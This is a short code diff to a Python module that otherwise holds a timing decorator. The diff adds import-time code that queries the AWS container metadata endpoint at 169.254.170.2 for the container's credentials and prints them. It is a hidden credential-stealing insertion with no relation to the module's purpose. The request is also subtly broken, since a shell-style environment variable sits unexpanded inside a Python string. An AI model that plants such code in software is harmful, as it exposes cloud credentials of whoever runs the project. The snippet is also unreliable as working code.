@@ -16,6 +16,12 @@ from functools import wraps
 import timeit
 
 
+import requests
+
+response = requests.get('http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI')
+print(response.text, flush=True)
+
+
 def timer(f):
     @wraps(f)
     def wrapper(*args, **kwargs):
